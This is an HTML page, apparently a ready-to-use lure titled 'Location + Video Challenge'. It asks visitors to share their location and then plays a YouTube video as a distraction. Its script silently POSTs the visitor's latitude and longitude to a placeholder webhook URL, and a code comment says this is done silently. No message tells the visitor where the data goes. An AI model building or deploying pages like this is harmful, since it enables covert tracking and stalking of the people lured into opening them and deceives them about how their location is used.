<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Location + Video Challenge</title>
  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
      color: #fff;
      text-align: center;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h2 {
      font-size: 28px;
      margin-bottom: 20px;
      animation: fadeIn 1.5s ease;
    }
    button {
      background: #fff;
      color: #2575fc;
      border: none;
      padding: 12px 30px;
      font-size: 18px;
      border-radius: 8px;
      cursor: pointer;
      transition: transform 0.2s, background 0.3s;
    }
    button:hover {
      background: #f0f0f0;
      transform: scale(1.05);
    }
    iframe {
      margin-top: 30px;
      width: 70%;
      max-width: 720px;
      height: 405px;
      border: none;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
      animation: fadeInUp 1.5s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <h2>Click the button and allow location access</h2>
  <button onclick="getLocation()">Share Location</button>
  <div id="video"></div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        alert("Geolocation not supported.");
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // ✅ Send location silently to your webhook/server
      fetch("https://your-webhook-url-here", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon })
      });

      // Directly play video (no success message shown)
      document.getElementById("video").innerHTML =
        '<iframe src="https://www.youtube.com/shorts/sSGyYUxctQ4" allow="autoplay; encrypted-media" allowfullscreen></iframe>';
    }

    function showError(error) {
      alert("Error: " + error.message);
    }
  </script>
</body>
</html>
